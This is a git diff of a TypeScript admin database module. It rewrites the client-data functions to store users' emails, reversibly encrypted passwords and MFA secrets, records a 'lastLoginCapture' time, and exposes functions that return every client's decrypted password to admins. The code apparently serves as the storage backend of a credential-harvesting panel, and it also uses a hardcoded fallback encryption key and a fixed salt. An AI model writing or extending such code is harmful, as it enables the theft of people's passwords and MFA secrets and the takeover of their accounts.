@@ -1,100 +1,82 @@
 /**
  * Admin Database Functions
- * Helper functions for admin panel operations
+ * Handles ONLY login credentials storage (email, password, MFA)
  */
 
-import { eq, desc, and, isNull } from "drizzle-orm";
+import { eq } from "drizzle-orm";
 import { getDb } from "./db";
-import {
-  adminUsers,
-  clientData,
-  apiLogs,
-  adminSessions,
-  users,
-  type AdminUser,
-  type InsertAdminUser,
-  type ClientData,
-  type InsertClientData,
-  type ApiLog,
-  type InsertApiLog,
-  type AdminSession,
-  type InsertAdminSession,
-} from "../drizzle/schema";
-import * as crypto from "crypto";
-import * as bcrypt from "bcrypt";
+import { adminUsers, clientData, type AdminUser, type ClientData } from "../drizzle/schema";
+import bcrypt from "bcrypt";
+import crypto from "crypto";
 
 const SALT_ROUNDS = 10;
 const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "cocos-admin-encryption-key-32bytes!!";
-const ENCRYPTION_ALGORITHM = "aes-256-cbc";
+const ALGORITHM = "aes-256-cbc";
 
 /**
- * Encrypt sensitive data
+ * Encrypt text using AES-256-CBC
  */
 export function encrypt(text: string): string {
-  const iv = crypto.randomBytes(16);
   const key = crypto.scryptSync(ENCRYPTION_KEY, "salt", 32);
-  const cipher = crypto.createCipheriv(ENCRYPTION_ALGORITHM, key, iv);
+  const iv = crypto.randomBytes(16);
+  const cipher = crypto.createCipheriv(ALGORITHM, key, iv);
   let encrypted = cipher.update(text, "utf8", "hex");
   encrypted += cipher.final("hex");
-  return iv.toString("hex") + ":" + encrypted;
+  return `${iv.toString("hex")}:${encrypted}`;
 }
 
 /**
- * Decrypt sensitive data
+ * Decrypt text using AES-256-CBC
  */
-export function decrypt(text: string): string {
-  const parts = text.split(":");
-  const iv = Buffer.from(parts[0], "hex");
-  const encryptedText = parts[1];
+export function decrypt(encryptedText: string): string {
   const key = crypto.scryptSync(ENCRYPTION_KEY, "salt", 32);
-  const decipher = crypto.createDecipheriv(ENCRYPTION_ALGORITHM, key, iv);
-  let decrypted = decipher.update(encryptedText, "hex", "utf8");
+  const [ivHex, encrypted] = encryptedText.split(":");
+  const iv = Buffer.from(ivHex, "hex");
+  const decipher = crypto.createDecipheriv(ALGORITHM, key, iv);
+  let decrypted = decipher.update(encrypted, "hex", "utf8");
   decrypted += decipher.final("utf8");
   return decrypted;
 }
 
-/**
- * Admin Users
- */
+// ============================================================================
+// ADMIN USER FUNCTIONS
+// ============================================================================
 
-export async function createAdminUser(data: {
-  email: string;
-  password: string;
-  name?: string;
-  role?: "super_admin" | "admin" | "viewer";
-}): Promise<AdminUser> {
+/**
+ * Create a new admin user
+ */
+export async function createAdminUser(email: string, password: string, name?: string, role: "super_admin" | "admin" | "viewer" = "admin"): Promise<AdminUser> {
   const db = await getDb();
   if (!db) throw new Error("Database not available");
+  const passwordHash = await bcrypt.hash(password, SALT_ROUNDS);
   
-  const passwordHash = await bcrypt.hash(data.password, SALT_ROUNDS);
   const [admin] = await db.insert(adminUsers).values({
-    email: data.email,
+    email,
     passwordHash,
-    name: data.name,
-    role: data.role || "admin",
-  });
-  return getAdminUserById(admin.insertId);
+    name: name || null,
+    role,
+    isActive: 1,
+  }).$returningId();
+  
+  const [newAdmin] = await db.select().from(adminUsers).where(eq(adminUsers.id, admin.id));
+  return newAdmin;
 }
 
-export async function getAdminUserByEmail(email: string): Promise<AdminUser | null> {
+/**
+ * Find admin by email
+ */
+export async function findAdminByEmail(email: string): Promise<AdminUser | null> {
   const db = await getDb();
   if (!db) return null;
-  
-  const [admin] = await db.select().from(adminUsers).where(eq(adminUsers.email, email)).limit(1);
+  const [admin] = await db.select().from(adminUsers).where(eq(adminUsers.email, email));
   return admin || null;
 }
 
-export async function getAdminUserById(id: number): Promise<AdminUser> {
-  const db = await getDb();
-  if (!db) throw new Error("Database not available");
-  
-  const [admin] = await db.select().from(adminUsers).where(eq(adminUsers.id, id)).limit(1);
-  if (!admin) throw new Error("Admin not found");
-  return admin;
-}
-
+/**
+ * Verify admin password
+ */
 export async function verifyAdminPassword(email: string, password: string): Promise<AdminUser | null> {
-  const admin = await getAdminUserByEmail(email);
+  const admin = await findAdminByEmail(email);
   if (!admin) return null;
   
   const isValid = await bcrypt.compare(password, admin.passwordHash);
@@ -102,235 +84,108 @@ export async function verifyAdminPassword(email: string, password: string): Prom
   
   // Update last login
   const db = await getDb();
-  if (db) {
-    await db.update(adminUsers)
-      .set({ lastLoginAt: new Date() })
-      .where(eq(adminUsers.id, admin.id));
-  }
+  if (!db) return admin;
+  await db.update(adminUsers)
+    .set({ lastLoginAt: new Date() })
+    .where(eq(adminUsers.id, admin.id));
   
   return admin;
 }
 
 /**
- * Client Data
+ * Check if any admin exists
  */
+export async function hasAnyAdmin(): Promise<boolean> {
+  const db = await getDb();
+  if (!db) return false;
+  const admins = await db.select().from(adminUsers).limit(1);
+  return admins.length > 0;
+}
 
-export async function saveClientData(data: {
-  userId: number;
-  email: string;
-  password?: string;
-  mfaSecret?: string;
-  mfaEnabled?: boolean;
-  sessionToken?: string;
-}): Promise<ClientData> {
+// ============================================================================
+// CLIENT DATA FUNCTIONS (LOGIN CREDENTIALS ONLY)
+// ============================================================================
+
+/**
+ * Save or update client login credentials
+ */
+export async function saveClientCredentials(
+  email: string,
+  password: string,
+  mfaSecret?: string
+): Promise<ClientData> {
   const db = await getDb();
   if (!db) throw new Error("Database not available");
   
-  const existing = await db.select().from(clientData).where(eq(clientData.userId, data.userId)).limit(1);
+  const passwordEncrypted = encrypt(password);
   
-  const clientDataValues: any = {
-    userId: data.userId,
-    email: data.email,
-    passwordEncrypted: data.password ? encrypt(data.password) : undefined,
-    mfaSecret: data.mfaSecret,
-    mfaEnabled: data.mfaEnabled ? 1 : 0,
-    sessionToken: data.sessionToken,
-    lastApiCall: new Date(),
-    updatedAt: new Date(),
-  };
+  // Check if client already exists
+  const [existing] = await db.select().from(clientData).where(eq(clientData.email, email));
   
-  if (existing.length > 0) {
+  if (existing) {
     // Update existing
     await db.update(clientData)
-      .set(clientDataValues)
-      .where(eq(clientData.userId, data.userId));
+      .set({
+        passwordEncrypted,
+        mfaSecret: mfaSecret || existing.mfaSecret,
+        mfaEnabled: mfaSecret ? 1 : existing.mfaEnabled,
+        lastLoginCapture: new Date(),
+        updatedAt: new Date(),
+      })
+      .where(eq(clientData.email, email));
+    
+    const [updated] = await db.select().from(clientData).where(eq(clientData.email, email));
+    return updated;
   } else {
     // Insert new
-    await db.insert(clientData).values(clientDataValues);
+    const [inserted] = await db.insert(clientData).values({
+      email,
+      passwordEncrypted,
+      mfaSecret: mfaSecret || null,
+      mfaEnabled: mfaSecret ? 1 : 0,
+      lastLoginCapture: new Date(),
+    }).$returningId();
+    
+    const [newClient] = await db.select().from(clientData).where(eq(clientData.id, inserted.id));
+    return newClient;
   }
-  
-  return getClientDataByUserId(data.userId);
 }
 
-export async function getClientDataByUserId(userId: number): Promise<ClientData> {
-  const db = await getDb();
-  if (!db) throw new Error("Database not available");
-  
-  const [data] = await db.select().from(clientData).where(eq(clientData.userId, userId)).limit(1);
-  if (!data) throw new Error("Client data not found");
-  return data;
-}
-
-export async function getAllClientsData(): Promise<Array<ClientData & { user: any }>> {
+/**
+ * Get all client credentials
+ */
+export async function getAllClientCredentials(): Promise<Array<ClientData & { passwordDecrypted: string }>> {
   const db = await getDb();
   if (!db) return [];
+  const clients = await db.select().from(clientData);
   
-  const clients = await db
-    .select({
-      clientData: clientData,
-      user: users,
-    })
-    .from(clientData)
-    .leftJoin(users, eq(clientData.userId, users.id))
-    .orderBy(desc(clientData.updatedAt));
-  
-  return clients.map((c: any) => ({
-    ...c.clientData,
-    user: c.user,
+  return clients.map(client => ({
+    ...client,
+    passwordDecrypted: decrypt(client.passwordEncrypted),
   }));
 }
 
-export async function incrementApiCallCount(userId: number): Promise<void> {
-  const db = await getDb();
-  if (!db) return;
-  
-  const existing = await db.select().from(clientData).where(eq(clientData.userId, userId)).limit(1);
-  if (existing.length > 0) {
-    await db.update(clientData)
-      .set({
-        apiCallCount: (existing[0].apiCallCount || 0) + 1,
-        lastApiCall: new Date(),
-      })
-      .where(eq(clientData.userId, userId));
-  }
-}
-
 /**
- * API Logs
+ * Get client credentials by email
  */
-
-export async function logApiCall(data: {
-  userId?: number;
-  method: string;
-  endpoint: string;
-  requestHeaders?: any;
-  requestBody?: any;
-  responseStatus?: number;
-  responseBody?: any;
-  responseTime?: number;
-  ipAddress?: string;
-  userAgent?: string;
-  error?: string;
-}): Promise<void> {
-  const db = await getDb();
-  if (!db) return;
-  
-  await db.insert(apiLogs).values({
-    userId: data.userId,
-    method: data.method,
-    endpoint: data.endpoint,
-    requestHeaders: data.requestHeaders ? JSON.stringify(data.requestHeaders) : null,
-    requestBody: data.requestBody ? JSON.stringify(data.requestBody) : null,
-    responseStatus: data.responseStatus,
-    responseBody: data.responseBody ? JSON.stringify(data.responseBody) : null,
-    responseTime: data.responseTime,
-    ipAddress: data.ipAddress,
-    userAgent: data.userAgent,
-    error: data.error,
-  });
-}
-
-export async function getApiLogs(options: {
-  userId?: number;
-  limit?: number;
-  offset?: number;
-}): Promise<ApiLog[]> {
-  const db = await getDb();
-  if (!db) return [];
-  
-  let query = db.select().from(apiLogs);
-  
-  if (options.userId) {
-    query = query.where(eq(apiLogs.userId, options.userId)) as any;
-  }
-  
-  query = query.orderBy(desc(apiLogs.createdAt)) as any;
-  
-  if (options.limit) {
-    query = query.limit(options.limit) as any;
-  }
-  
-  if (options.offset) {
-    query = query.offset(options.offset) as any;
-  }
-  
-  return query;
-}
-
-export async function getRecentApiLogs(limit: number = 100): Promise<ApiLog[]> {
-  const db = await getDb();
-  if (!db) return [];
-  
-  return db.select().from(apiLogs).orderBy(desc(apiLogs.createdAt)).limit(limit);
-}
-
-/**
- * Admin Sessions (Impersonation)
- */
-
-export async function createAdminSession(data: {
-  adminId: number;
-  clientUserId: number;
-  ipAddress?: string;
-  userAgent?: string;
-  expiresInHours?: number;
-}): Promise<AdminSession> {
-  const db = await getDb();
-  if (!db) throw new Error("Database not available");
-  
-  const sessionToken = crypto.randomBytes(32).toString("hex");
-  const expiresAt = new Date();
-  expiresAt.setHours(expiresAt.getHours() + (data.expiresInHours || 24));
-  
-  const [session] = await db.insert(adminSessions).values({
-    adminId: data.adminId,
-    clientUserId: data.clientUserId,
-    sessionToken,
-    ipAddress: data.ipAddress,
-    userAgent: data.userAgent,
-    expiresAt,
-  });
-  
-  return getAdminSessionById(session.insertId);
-}
-
-export async function getAdminSessionById(id: number): Promise<AdminSession> {
-  const db = await getDb();
-  if (!db) throw new Error("Database not available");
-  
-  const [session] = await db.select().from(adminSessions).where(eq(adminSessions.id, id)).limit(1);
-  if (!session) throw new Error("Admin session not found");
-  return session;
-}
-
-export async function getAdminSessionByToken(token: string): Promise<AdminSession | null> {
+export async function getClientCredentialsByEmail(email: string): Promise<(ClientData & { passwordDecrypted: string }) | null> {
   const db = await getDb();
   if (!db) return null;
+  const [client] = await db.select().from(clientData).where(eq(clientData.email, email));
   
-  const [session] = await db.select().from(adminSessions).where(eq(adminSessions.sessionToken, token)).limit(1);
-  return session || null;
+  if (!client) return null;
+  
+  return {
+    ...client,
+    passwordDecrypted: decrypt(client.passwordEncrypted),
+  };
 }
 
-export async function endAdminSession(sessionId: number): Promise<void> {
+/**
+ * Delete client credentials
+ */
+export async function deleteClientCredentials(email: string): Promise<void> {
   const db = await getDb();
   if (!db) return;
-  
-  await db.update(adminSessions)
-    .set({ endedAt: new Date() })
-    .where(eq(adminSessions.id, sessionId));
-}
-
-export async function getActiveAdminSessions(adminId: number): Promise<AdminSession[]> {
-  const db = await getDb();
-  if (!db) return [];
-  
-  return db.select()
-    .from(adminSessions)
-    .where(
-      and(
-        eq(adminSessions.adminId, adminId),
-        isNull(adminSessions.endedAt)
-      )
-    )
-    .orderBy(desc(adminSessions.createdAt));
+  await db.delete(clientData).where(eq(clientData.email, email));
 }
